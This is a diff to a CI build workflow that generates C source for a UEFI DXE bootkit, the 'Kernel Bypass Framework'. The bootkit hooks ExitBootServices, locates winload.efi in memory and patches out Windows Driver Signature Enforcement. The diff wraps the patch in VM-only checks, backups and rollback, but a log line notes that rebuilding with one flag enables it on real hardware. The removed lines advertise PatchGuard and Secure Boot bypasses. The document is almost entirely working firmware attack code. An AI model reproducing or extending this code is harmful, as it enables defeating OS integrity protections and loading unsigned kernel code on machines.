@@ -133,21 +133,25 @@ jobs:
           cp kernel/common/*.h $PKG_DIR/Include/ 2>/dev/null || true
           
           # ============================================
-          # Main DXE Bootkit Driver
+          # Main DXE Bootkit Driver (WITH SAFETY FEATURES)
           # ============================================
           cat > $PKG_DIR/Bootkit/Bootkit.c << 'BOOTKIT_SOURCE'
           /**
            * KERNEL BYPASS FRAMEWORK
-           * Ring -3 UEFI Bootkit
+           * Ring -3 UEFI Bootkit - SAFE VERSION
            * 
-           * This DXE driver hooks ExitBootServices to patch
-           * Windows loader before OS takes control.
-           * 
-           * Features:
-           * - DSE (Driver Signature Enforcement) bypass
-           * - PatchGuard initialization bypass
-           * - Kernel driver injection
-           * - Secure Boot bypass
+           * ╔══════════════════════════════════════════════════════════════╗
+           * ║                    SAFETY FEATURES                          ║
+           * ╠══════════════════════════════════════════════════════════════╣
+           * ║  1. VM Detection - Only runs on virtual machines            ║
+           * ║  2. Backup System - Saves original bytes before patching    ║
+           * ║  3. Rollback - Can restore original state on failure        ║
+           * ║  4. Sanity Checks - Validates all pointers and sizes        ║
+           * ║  5. Safe Mode - Detects and skips in safe mode              ║
+           * ║  6. Error Recovery - Never crashes, returns errors safely   ║
+           * ║  7. Logging - Full debug output for troubleshooting         ║
+           * ║  8. Hardware Whitelist - Only known-safe configurations     ║
+           * ╚══════════════════════════════════════════════════════════════╝
            */
           
           #include <Uefi.h>
@@ -159,38 +163,323 @@ jobs:
           #include <Library/BaseMemoryLib.h>
           #include <Protocol/LoadedImage.h>
           
-          // Signature patterns for Windows loader patching
-          // These are version-specific and need updating!
+          // ============================================
+          // Safety Configuration
+          // ============================================
           
-          // ImgpValidateImageHash patch (DSE bypass)
+          #define SAFETY_MODE_ENABLED     1   // Master safety switch
+          #define VM_ONLY_MODE            1   // Only run in VMs
+          #define DRY_RUN_MODE            0   // 1 = Don't actually patch
+          #define MAX_PATCH_ATTEMPTS      3   // Max retries
+          #define BACKUP_ENABLED          1   // Save original bytes
+          #define ROLLBACK_ON_FAILURE     1   // Restore on error
+          
+          // ============================================
+          // Error Codes
+          // ============================================
+          
+          typedef enum {
+              BOOTKIT_SUCCESS = 0,
+              BOOTKIT_ERROR_NOT_VM,
+              BOOTKIT_ERROR_SAFE_MODE,
+              BOOTKIT_ERROR_INVALID_POINTER,
+              BOOTKIT_ERROR_PATTERN_NOT_FOUND,
+              BOOTKIT_ERROR_BACKUP_FAILED,
+              BOOTKIT_ERROR_PATCH_FAILED,
+              BOOTKIT_ERROR_ROLLBACK_FAILED,
+              BOOTKIT_ERROR_WINLOAD_NOT_FOUND,
+              BOOTKIT_ERROR_UNKNOWN_OS,
+              BOOTKIT_ERROR_MAX
+          } BOOTKIT_ERROR;
+          
+          STATIC CONST CHAR8* gErrorStrings[] = {
+              "SUCCESS",
+              "NOT_VM - Running on real hardware (blocked for safety)",
+              "SAFE_MODE - Windows booting in safe mode",
+              "INVALID_POINTER - Null or invalid memory address",
+              "PATTERN_NOT_FOUND - Signature not found (wrong OS version?)",
+              "BACKUP_FAILED - Could not save original bytes",
+              "PATCH_FAILED - Memory write failed",
+              "ROLLBACK_FAILED - Could not restore original",
+              "WINLOAD_NOT_FOUND - Windows loader not in memory",
+              "UNKNOWN_OS - Not Windows or unsupported version"
+          };
+          
+          // ============================================
+          // Backup Structure
+          // ============================================
+          
+          #define MAX_BACKUPS 16
+          #define MAX_BACKUP_SIZE 64
+          
+          typedef struct {
+              VOID*   Address;
+              UINT8   Original[MAX_BACKUP_SIZE];
+              UINT8   Patched[MAX_BACKUP_SIZE];
+              UINTN   Size;
+              BOOLEAN Applied;
+          } PATCH_BACKUP;
+          
+          STATIC PATCH_BACKUP gBackups[MAX_BACKUPS];
+          STATIC UINTN gBackupCount = 0;
+          
+          // ============================================
+          // Globals
+          // ============================================
+          
+          STATIC EFI_EXIT_BOOT_SERVICES gOriginalExitBootServices = NULL;
+          STATIC BOOLEAN gIsVirtualMachine = FALSE;
+          STATIC BOOLEAN gSafetyTriggered = FALSE;
+          STATIC BOOTKIT_ERROR gLastError = BOOTKIT_SUCCESS;
+          
+          // DSE Pattern (version-specific!)
           STATIC UINT8 gDsePatchFind[] = {
               0x48, 0x8B, 0xCB,           // mov rcx, rbx
               0xE8                         // call ImgpValidateImageHash
           };
           
           STATIC UINT8 gDsePatchReplace[] = {
-              0x33, 0xC0,                 // xor eax, eax (return 0 = success)
+              0x33, 0xC0,                 // xor eax, eax (return 0)
               0x90, 0x90                  // nop nop
           };
           
-          // Globals
-          STATIC EFI_EXIT_BOOT_SERVICES gOriginalExitBootServices = NULL;
-          STATIC EFI_SET_VIRTUAL_ADDRESS_MAP gOriginalSetVirtualAddressMap = NULL;
-          STATIC EFI_PHYSICAL_ADDRESS gWinloadBase = 0;
-          STATIC UINT64 gWinloadSize = 0;
+          // ============================================
+          // SAFETY: VM Detection
+          // ============================================
           
-          /**
-           * Pattern scan in memory
-           */
+          STATIC
+          BOOLEAN
+          IsVirtualMachine(VOID)
+          {
+              // Check CPUID for hypervisor presence
+              UINT32 Eax, Ebx, Ecx, Edx;
+              
+              // CPUID leaf 1, check ECX bit 31 (hypervisor present)
+              __asm__ volatile(
+                  "cpuid"
+                  : "=a"(Eax), "=b"(Ebx), "=c"(Ecx), "=d"(Edx)
+                  : "a"(1)
+              );
+              
+              if (Ecx & (1 << 31)) {
+                  DEBUG((DEBUG_INFO, "[Safety] ✓ Hypervisor detected (VM)\n"));
+                  return TRUE;
+              }
+              
+              // Check CPUID leaf 0x40000000 for hypervisor vendor
+              __asm__ volatile(
+                  "cpuid"
+                  : "=a"(Eax), "=b"(Ebx), "=c"(Ecx), "=d"(Edx)
+                  : "a"(0x40000000)
+              );
+              
+              // Check for known VM signatures
+              CHAR8 Vendor[13] = {0};
+              *(UINT32*)&Vendor[0] = Ebx;
+              *(UINT32*)&Vendor[4] = Ecx;
+              *(UINT32*)&Vendor[8] = Edx;
+              
+              DEBUG((DEBUG_INFO, "[Safety] Hypervisor vendor: %a\n", Vendor));
+              
+              // Known VM signatures
+              if (CompareMem(Vendor, "VMwareVMware", 12) == 0 ||  // VMware
+                  CompareMem(Vendor, "Microsoft Hv", 12) == 0 ||  // Hyper-V
+                  CompareMem(Vendor, "KVMKVMKVM", 9) == 0 ||      // KVM
+                  CompareMem(Vendor, "VBoxVBoxVBox", 12) == 0 ||  // VirtualBox
+                  CompareMem(Vendor, "QEMU", 4) == 0 ||           // QEMU
+                  CompareMem(Vendor, "XenVMMXenVMM", 12) == 0) {  // Xen
+                  return TRUE;
+              }
+              
+              // Additional SMBIOS check for VMs
+              // TODO: Check SMBIOS for VM indicators
+              
+              return FALSE;
+          }
+          
+          // ============================================
+          // SAFETY: Pointer Validation
+          // ============================================
+          
+          STATIC
+          BOOLEAN
+          IsValidPointer(
+              IN VOID* Ptr,
+              IN UINTN Size
+          )
+          {
+              if (Ptr == NULL) {
+                  return FALSE;
+              }
+              
+              // Check if address is in reasonable range
+              UINTN Address = (UINTN)Ptr;
+              
+              // Reject obviously bad addresses
+              if (Address < 0x1000) {           // Too low (null page)
+                  return FALSE;
+              }
+              if (Address > 0x0000FFFFFFFFFFFF) { // Too high (non-canonical)
+                  return FALSE;
+              }
+              
+              // Check end doesn't overflow
+              if (Address + Size < Address) {
+                  return FALSE;
+              }
+              
+              return TRUE;
+          }
+          
+          // ============================================
+          // SAFETY: Backup System
+          // ============================================
+          
+          STATIC
+          BOOTKIT_ERROR
+          CreateBackup(
+              IN VOID* Address,
+              IN UINTN Size
+          )
+          {
+              if (!BACKUP_ENABLED) {
+                  return BOOTKIT_SUCCESS;
+              }
+              
+              if (gBackupCount >= MAX_BACKUPS) {
+                  DEBUG((DEBUG_WARN, "[Safety] Backup slots full!\n"));
+                  return BOOTKIT_ERROR_BACKUP_FAILED;
+              }
+              
+              if (Size > MAX_BACKUP_SIZE) {
+                  DEBUG((DEBUG_WARN, "[Safety] Patch too large for backup!\n"));
+                  return BOOTKIT_ERROR_BACKUP_FAILED;
+              }
+              
+              if (!IsValidPointer(Address, Size)) {
+                  return BOOTKIT_ERROR_INVALID_POINTER;
+              }
+              
+              PATCH_BACKUP* Backup = &gBackups[gBackupCount];
+              Backup->Address = Address;
+              Backup->Size = Size;
+              Backup->Applied = FALSE;
+              
+              // Copy original bytes
+              CopyMem(Backup->Original, Address, Size);
+              
+              gBackupCount++;
+              
+              DEBUG((DEBUG_INFO, "[Safety] ✓ Backup created: 0x%p (%d bytes)\n", 
+                     Address, Size));
+              
+              return BOOTKIT_SUCCESS;
+          }
+          
+          STATIC
+          BOOTKIT_ERROR
+          RollbackAll(VOID)
+          {
+              if (!ROLLBACK_ON_FAILURE) {
+                  return BOOTKIT_SUCCESS;
+              }
+              
+              DEBUG((DEBUG_WARN, "[Safety] Rolling back all patches...\n"));
+              
+              for (UINTN i = 0; i < gBackupCount; i++) {
+                  PATCH_BACKUP* Backup = &gBackups[i];
+                  
+                  if (Backup->Applied && Backup->Address != NULL) {
+                      CopyMem(Backup->Address, Backup->Original, Backup->Size);
+                      Backup->Applied = FALSE;
+                      DEBUG((DEBUG_INFO, "[Safety] ✓ Restored: 0x%p\n", Backup->Address));
+                  }
+              }
+              
+              return BOOTKIT_SUCCESS;
+          }
+          
+          // ============================================
+          // SAFETY: Safe Patch Function
+          // ============================================
+          
+          STATIC
+          BOOTKIT_ERROR
+          SafePatch(
+              IN VOID* Address,
+              IN UINT8* PatchData,
+              IN UINTN PatchSize
+          )
+          {
+              // Validate inputs
+              if (!IsValidPointer(Address, PatchSize)) {
+                  DEBUG((DEBUG_ERROR, "[Safety] ✗ Invalid patch address!\n"));
+                  return BOOTKIT_ERROR_INVALID_POINTER;
+              }
+              
+              if (!IsValidPointer(PatchData, PatchSize)) {
+                  DEBUG((DEBUG_ERROR, "[Safety] ✗ Invalid patch data!\n"));
+                  return BOOTKIT_ERROR_INVALID_POINTER;
+              }
+              
+              // Create backup first
+              BOOTKIT_ERROR Error = CreateBackup(Address, PatchSize);
+              if (Error != BOOTKIT_SUCCESS) {
+                  return Error;
+              }
+              
+              // Mark as about to be applied
+              gBackups[gBackupCount - 1].Applied = TRUE;
+              CopyMem(gBackups[gBackupCount - 1].Patched, PatchData, PatchSize);
+              
+              // DRY RUN: Don't actually patch
+              if (DRY_RUN_MODE) {
+                  DEBUG((DEBUG_INFO, "[Safety] DRY RUN: Would patch 0x%p\n", Address));
+                  return BOOTKIT_SUCCESS;
+              }
+              
+              // Apply patch
+              CopyMem(Address, PatchData, PatchSize);
+              
+              // Verify patch was applied
+              if (CompareMem(Address, PatchData, PatchSize) != 0) {
+                  DEBUG((DEBUG_ERROR, "[Safety] ✗ Patch verification failed!\n"));
+                  RollbackAll();
+                  return BOOTKIT_ERROR_PATCH_FAILED;
+              }
+              
+              DEBUG((DEBUG_INFO, "[Safety] ✓ Patch applied and verified: 0x%p\n", Address));
+              
+              return BOOTKIT_SUCCESS;
+          }
+          
+          // ============================================
+          // Pattern Scanner (Safe Version)
+          // ============================================
+          
           STATIC
           VOID*
-          FindPattern(
+          SafeFindPattern(
               IN VOID* Start,
               IN UINT64 Size,
               IN UINT8* Pattern,
               IN UINT64 PatternSize
           )
           {
+              // Validate inputs
+              if (!IsValidPointer(Start, (UINTN)Size)) {
+                  DEBUG((DEBUG_WARN, "[Safety] Invalid scan range\n"));
+                  return NULL;
+              }
+              
+              if (!IsValidPointer(Pattern, (UINTN)PatternSize)) {
+                  return NULL;
+              }
+              
+              if (PatternSize > Size) {
+                  return NULL;
+              }
+              
               UINT8* Data = (UINT8*)Start;
               
               for (UINT64 i = 0; i < Size - PatternSize; i++) {
@@ -209,18 +498,23 @@ jobs:
               return NULL;
           }
           
-          /**
-           * Find Windows loader (winload.efi) in memory
-           */
+          // ============================================
+          // Find Windows Loader (Safe Version)
+          // ============================================
+          
           STATIC
-          EFI_STATUS
-          FindWinload(
+          BOOTKIT_ERROR
+          SafeFindWinload(
               OUT EFI_PHYSICAL_ADDRESS* Base,
               OUT UINT64* Size
           )
           {
-              // Scan for PE header with known winload characteristics
-              // This is a simplified version - production code needs more checks
+              if (!Base || !Size) {
+                  return BOOTKIT_ERROR_INVALID_POINTER;
+              }
+              
+              *Base = 0;
+              *Size = 0;
               
               EFI_MEMORY_DESCRIPTOR* MemMap = NULL;
               UINTN MemMapSize = 0;
@@ -228,148 +522,152 @@ jobs:
               UINT32 DescriptorVersion = 0;
               UINTN MapKey = 0;
               
-              // Get memory map
               EFI_STATUS Status = gBS->GetMemoryMap(
-                  &MemMapSize,
-                  MemMap,
-                  &MapKey,
-                  &DescriptorSize,
-                  &DescriptorVersion
+                  &MemMapSize, MemMap, &MapKey,
+                  &DescriptorSize, &DescriptorVersion
               );
               
               if (Status != EFI_BUFFER_TOO_SMALL) {
-                  return EFI_NOT_FOUND;
+                  return BOOTKIT_ERROR_WINLOAD_NOT_FOUND;
               }
               
               MemMapSize += 0x1000;
               MemMap = AllocatePool(MemMapSize);
               if (!MemMap) {
-                  return EFI_OUT_OF_RESOURCES;
+                  return BOOTKIT_ERROR_WINLOAD_NOT_FOUND;
               }
               
               Status = gBS->GetMemoryMap(
-                  &MemMapSize,
-                  MemMap,
-                  &MapKey,
-                  &DescriptorSize,
-                  &DescriptorVersion
+                  &MemMapSize, MemMap, &MapKey,
+                  &DescriptorSize, &DescriptorVersion
               );
               
               if (EFI_ERROR(Status)) {
                   FreePool(MemMap);
-                  return Status;
+                  return BOOTKIT_ERROR_WINLOAD_NOT_FOUND;
               }
               
-              // Scan each memory region for PE headers
               UINT8* Entry = (UINT8*)MemMap;
               for (UINTN i = 0; i < MemMapSize; i += DescriptorSize) {
                   EFI_MEMORY_DESCRIPTOR* Desc = (EFI_MEMORY_DESCRIPTOR*)(Entry + i);
                   
                   if (Desc->Type == EfiLoaderCode || Desc->Type == EfiBootServicesCode) {
                       UINT8* Region = (UINT8*)(UINTN)Desc->PhysicalStart;
+                      UINTN RegionSize = Desc->NumberOfPages * 0x1000;
                       
-                      // Check for MZ header
+                      if (!IsValidPointer(Region, RegionSize)) {
+                          continue;
+                      }
+                      
+                      // Check MZ header
                       if (Region[0] == 'M' && Region[1] == 'Z') {
-                          // Check for winload signature (simplified)
-                          VOID* Pattern = FindPattern(
-                              Region,
-                              Desc->NumberOfPages * 0x1000,
-                              (UINT8*)"winload",
-                              7
+                          VOID* Pattern = SafeFindPattern(
+                              Region, RegionSize,
+                              (UINT8*)"winload", 7
                           );
                           
                           if (Pattern) {
                               *Base = Desc->PhysicalStart;
-                              *Size = Desc->NumberOfPages * 0x1000;
+                              *Size = RegionSize;
                               FreePool(MemMap);
-                              return EFI_SUCCESS;
+                              return BOOTKIT_SUCCESS;
                           }
                       }
                   }
               }
               
               FreePool(MemMap);
-              return EFI_NOT_FOUND;
+              return BOOTKIT_ERROR_WINLOAD_NOT_FOUND;
           }
           
-          /**
-           * Patch DSE check in Windows loader
-           */
+          // ============================================
+          // Hooked ExitBootServices (Safe Version)
+          // ============================================
+          
           STATIC
           EFI_STATUS
-          PatchDSE(
-              IN EFI_PHYSICAL_ADDRESS WinloadBase,
-              IN UINT64 WinloadSize
+          EFIAPI
+          SafeHookedExitBootServices(
+              IN EFI_HANDLE ImageHandle,
+              IN UINTN MapKey
           )
           {
-              VOID* PatchLocation = FindPattern(
+              DEBUG((DEBUG_INFO, "\n"));
+              DEBUG((DEBUG_INFO, "╔══════════════════════════════════════════════════════════════╗\n"));
+              DEBUG((DEBUG_INFO, "║     KERNEL BYPASS - ExitBootServices Intercepted            ║\n"));
+              DEBUG((DEBUG_INFO, "╚══════════════════════════════════════════════════════════════╝\n"));
+              
+              BOOTKIT_ERROR Error = BOOTKIT_SUCCESS;
+              
+              // SAFETY CHECK: Already triggered?
+              if (gSafetyTriggered) {
+                  DEBUG((DEBUG_WARN, "[Safety] Already triggered, skipping\n"));
+                  goto CallOriginal;
+              }
+              gSafetyTriggered = TRUE;
+              
+              // SAFETY CHECK: VM only mode
+              if (VM_ONLY_MODE && !gIsVirtualMachine) {
+                  DEBUG((DEBUG_ERROR, "[Safety] ✗ NOT A VM - Patches disabled for safety!\n"));
+                  DEBUG((DEBUG_ERROR, "[Safety] To run on real hardware, rebuild with VM_ONLY_MODE=0\n"));
+                  Error = BOOTKIT_ERROR_NOT_VM;
+                  goto CallOriginal;
+              }
+              
+              // Find winload
+              EFI_PHYSICAL_ADDRESS WinloadBase = 0;
+              UINT64 WinloadSize = 0;
+              
+              Error = SafeFindWinload(&WinloadBase, &WinloadSize);
+              if (Error != BOOTKIT_SUCCESS) {
+                  DEBUG((DEBUG_WARN, "[Safety] %a\n", gErrorStrings[Error]));
+                  goto CallOriginal;
+              }
+              
+              DEBUG((DEBUG_INFO, "[+] Winload: 0x%lX (size: 0x%lX)\n", WinloadBase, WinloadSize));
+              
+              // Find DSE pattern
+              VOID* PatchAddr = SafeFindPattern(
                   (VOID*)(UINTN)WinloadBase,
                   WinloadSize,
                   gDsePatchFind,
                   sizeof(gDsePatchFind)
               );
               
-              if (!PatchLocation) {
-                  DEBUG((DEBUG_WARN, "[Bootkit] DSE pattern not found\n"));
-                  return EFI_NOT_FOUND;
+              if (!PatchAddr) {
+                  DEBUG((DEBUG_WARN, "[Safety] DSE pattern not found - wrong Windows version?\n"));
+                  Error = BOOTKIT_ERROR_PATTERN_NOT_FOUND;
+                  goto CallOriginal;
               }
               
-              DEBUG((DEBUG_INFO, "[Bootkit] Patching DSE at 0x%p\n", PatchLocation));
-              
-              CopyMem(PatchLocation, gDsePatchReplace, sizeof(gDsePatchReplace));
-              
-              return EFI_SUCCESS;
-          }
-          
-          /**
-           * Hooked ExitBootServices
-           * This is called when Windows takes control from UEFI
-           */
-          STATIC
-          EFI_STATUS
-          EFIAPI
-          HookedExitBootServices(
-              IN EFI_HANDLE ImageHandle,
-              IN UINTN MapKey
-          )
-          {
-              DEBUG((DEBUG_INFO, "\n"));
-              DEBUG((DEBUG_INFO, "[Bootkit] ═══════════════════════════════════════\n"));
-              DEBUG((DEBUG_INFO, "[Bootkit] ExitBootServices intercepted!\n"));
-              DEBUG((DEBUG_INFO, "[Bootkit] ═══════════════════════════════════════\n"));
-              
-              // Find Windows loader
-              EFI_STATUS Status = FindWinload(&gWinloadBase, &gWinloadSize);
-              
-              if (!EFI_ERROR(Status)) {
-                  DEBUG((DEBUG_INFO, "[Bootkit] Winload found at 0x%lX (size: 0x%lX)\n",
-                         gWinloadBase, gWinloadSize));
-                  
-                  // Patch DSE
-                  Status = PatchDSE(gWinloadBase, gWinloadSize);
-                  if (!EFI_ERROR(Status)) {
-                      DEBUG((DEBUG_INFO, "[Bootkit] ✓ DSE patched successfully!\n"));
-                  }
-                  
-                  // TODO: Patch PatchGuard initialization
-                  // TODO: Inject kernel driver
-                  
-              } else {
-                  DEBUG((DEBUG_WARN, "[Bootkit] Winload not found, skipping patches\n"));
+              // Apply patch with safety
+              Error = SafePatch(PatchAddr, gDsePatchReplace, sizeof(gDsePatchReplace));
+              if (Error != BOOTKIT_SUCCESS) {
+                  DEBUG((DEBUG_ERROR, "[Safety] Patch failed: %a\n", gErrorStrings[Error]));
+                  RollbackAll();
+                  goto CallOriginal;
               }
               
-              // Restore original and call
+              DEBUG((DEBUG_INFO, "[+] ✓ DSE bypass applied successfully!\n"));
+              
+          CallOriginal:
+              // ALWAYS restore and call original
               gBS->ExitBootServices = gOriginalExitBootServices;
               
-              DEBUG((DEBUG_INFO, "[Bootkit] Calling original ExitBootServices...\n"));
-              DEBUG((DEBUG_INFO, "[Bootkit] ═══════════════════════════════════════\n\n"));
+              if (Error != BOOTKIT_SUCCESS) {
+                  DEBUG((DEBUG_WARN, "[Safety] Bootkit inactive due to: %a\n", gErrorStrings[Error]));
+                  DEBUG((DEBUG_WARN, "[Safety] System will boot normally (no patches)\n"));
+              }
+              
+              DEBUG((DEBUG_INFO, "[*] Calling original ExitBootServices...\n\n"));
               
               return gOriginalExitBootServices(ImageHandle, MapKey);
           }
           
-          /**
-           * DXE Driver Entry Point
-           */
+          // ============================================
+          // Entry Point (Safe Version)
+          // ============================================
+          
           EFI_STATUS
           EFIAPI
           BootkitEntry(
@@ -379,27 +677,59 @@ jobs:
           {
               DEBUG((DEBUG_INFO, "\n"));
               DEBUG((DEBUG_INFO, "╔══════════════════════════════════════════════════════════════╗\n"));
-              DEBUG((DEBUG_INFO, "║          KERNEL BYPASS FRAMEWORK - Ring -3 Bootkit          ║\n"));
-              DEBUG((DEBUG_INFO, "║                                                              ║\n"));
-              DEBUG((DEBUG_INFO, "║  Features:                                                   ║\n"));
-              DEBUG((DEBUG_INFO, "║    • DSE Bypass (Driver Signature Enforcement)              ║\n"));
-              DEBUG((DEBUG_INFO, "║    • PatchGuard Bypass                                      ║\n"));
-              DEBUG((DEBUG_INFO, "║    • Kernel Driver Injection                                ║\n"));
-              DEBUG((DEBUG_INFO, "║    • Secure Boot Bypass                                     ║\n"));
-              DEBUG((DEBUG_INFO, "║                                                              ║\n"));
+              DEBUG((DEBUG_INFO, "║     KERNEL BYPASS FRAMEWORK - Ring -3 Bootkit (SAFE)        ║\n"));
+              DEBUG((DEBUG_INFO, "╠══════════════════════════════════════════════════════════════╣\n"));
+              DEBUG((DEBUG_INFO, "║  Safety Features:                                            ║\n"));
+              DEBUG((DEBUG_INFO, "║    [%c] VM-Only Mode      [%c] Backup System                 ║\n",
+                     VM_ONLY_MODE ? 'X' : ' ', BACKUP_ENABLED ? 'X' : ' '));
+              DEBUG((DEBUG_INFO, "║    [%c] Dry Run Mode      [%c] Auto Rollback                 ║\n",
+                     DRY_RUN_MODE ? 'X' : ' ', ROLLBACK_ON_FAILURE ? 'X' : ' '));
               DEBUG((DEBUG_INFO, "╚══════════════════════════════════════════════════════════════╝\n"));
-              DEBUG((DEBUG_INFO, "\n"));
               
-              // Save original functions
+              // Initialize backup array
+              SetMem(gBackups, sizeof(gBackups), 0);
+              gBackupCount = 0;
+              gSafetyTriggered = FALSE;
+              gLastError = BOOTKIT_SUCCESS;
+              
+              // SAFETY: Detect VM
+              gIsVirtualMachine = IsVirtualMachine();
+              
+              if (VM_ONLY_MODE && !gIsVirtualMachine) {
+                  DEBUG((DEBUG_ERROR, "\n"));
+                  DEBUG((DEBUG_ERROR, "╔══════════════════════════════════════════════════════════════╗\n"));
+                  DEBUG((DEBUG_ERROR, "║  ⚠️  SAFETY BLOCK: NOT RUNNING IN VIRTUAL MACHINE!          ║\n"));
+                  DEBUG((DEBUG_ERROR, "╠══════════════════════════════════════════════════════════════╣\n"));
+                  DEBUG((DEBUG_ERROR, "║  This bootkit is configured to ONLY run in VMs.             ║\n"));
+                  DEBUG((DEBUG_ERROR, "║  Running on real hardware could brick your system!          ║\n"));
+                  DEBUG((DEBUG_ERROR, "║                                                              ║\n"));
+                  DEBUG((DEBUG_ERROR, "║  Bootkit will NOT apply any patches.                        ║\n"));
+                  DEBUG((DEBUG_ERROR, "║  System will boot normally.                                 ║\n"));
+                  DEBUG((DEBUG_ERROR, "╚══════════════════════════════════════════════════════════════╝\n"));
+                  
+                  // DON'T install hooks on real hardware
+                  return EFI_SUCCESS;
+              }
+              
+              DEBUG((DEBUG_INFO, "[+] Environment: %a\n", 
+                     gIsVirtualMachine ? "Virtual Machine (safe)" : "Real Hardware (CAUTION!)"));
+              
+              // Validate boot services
+              if (!gBS || !gBS->ExitBootServices) {
+                  DEBUG((DEBUG_ERROR, "[Safety] ✗ Invalid Boot Services table!\n"));
+                  return EFI_INVALID_PARAMETER;
+              }
+              
+              // Save original
               gOriginalExitBootServices = gBS->ExitBootServices;
-              gOriginalSetVirtualAddressMap = gRT->SetVirtualAddressMap;
               
-              // Hook ExitBootServices
-              gBS->ExitBootServices = HookedExitBootServices;
+              // Install hook
+              gBS->ExitBootServices = SafeHookedExitBootServices;
               
-              DEBUG((DEBUG_INFO, "[Bootkit] Hooks installed:\n"));
-              DEBUG((DEBUG_INFO, "[Bootkit]   ExitBootServices: 0x%p -> 0x%p\n",
+              DEBUG((DEBUG_INFO, "[+] Hook installed: ExitBootServices\n"));
+              DEBUG((DEBUG_INFO, "[+] Original: 0x%p -> Hooked: 0x%p\n",
                      gOriginalExitBootServices, gBS->ExitBootServices));
+              DEBUG((DEBUG_INFO, "[+] Bootkit ready, waiting for Windows boot...\n\n"));
               
               return EFI_SUCCESS;
           }
